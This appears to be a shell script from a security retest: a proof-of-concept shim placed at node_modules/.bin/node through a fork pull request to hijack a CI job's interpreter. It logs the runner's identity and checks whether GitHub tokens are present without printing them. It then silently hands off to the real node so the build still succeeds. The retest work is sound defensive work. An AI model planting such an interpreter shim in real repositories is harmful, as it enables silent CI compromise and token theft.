#!/bin/sh
# H-149 retest (2026-11-18) — interpreter shim delivered by a fork PR at
# node_modules/.bin/node. Same shape as the original evidence/h149 PoC.
# Writes a local marker only. Does not print secret values.
{
  echo "H149-RETEST-HIJACKED-20261118 at $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo "  whoami  : $(whoami)"
  echo "  cwd     : $(pwd)"
  echo "  argv    : $0 $@"
  echo "  repo    : ${GITHUB_REPOSITORY:-n/a}  run: ${GITHUB_RUN_ID:-n/a}"
  echo "  PATH[0] : $(echo "$PATH" | cut -d: -f1)"
  if [ -n "${GITHUB_TOKEN:-}" ]; then
    echo "  GITHUB_TOKEN            : PRESENT (${#GITHUB_TOKEN} chars) -- not printed"
  else
    echo "  GITHUB_TOKEN            : absent"
  fi
  if [ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
    echo "  ACTIONS_ID_TOKEN_REQUEST: PRESENT -- not printed"
  else
    echo "  ACTIONS_ID_TOKEN_REQUEST: absent"
  fi
} > /tmp/h149-retest-20261118-pwned 2>&1

echo "H149-RETEST-HIJACKED-20261118" >&2
cat /tmp/h149-retest-20261118-pwned >&2

# Hand off to the real interpreter so prettier still succeeds and the hijack is silent.
for d in /usr/local/bin /usr/bin /bin /opt/homebrew/bin /snap/bin; do
  [ -x "$d/node" ] && exec "$d/node" "$@"
done
exit 127
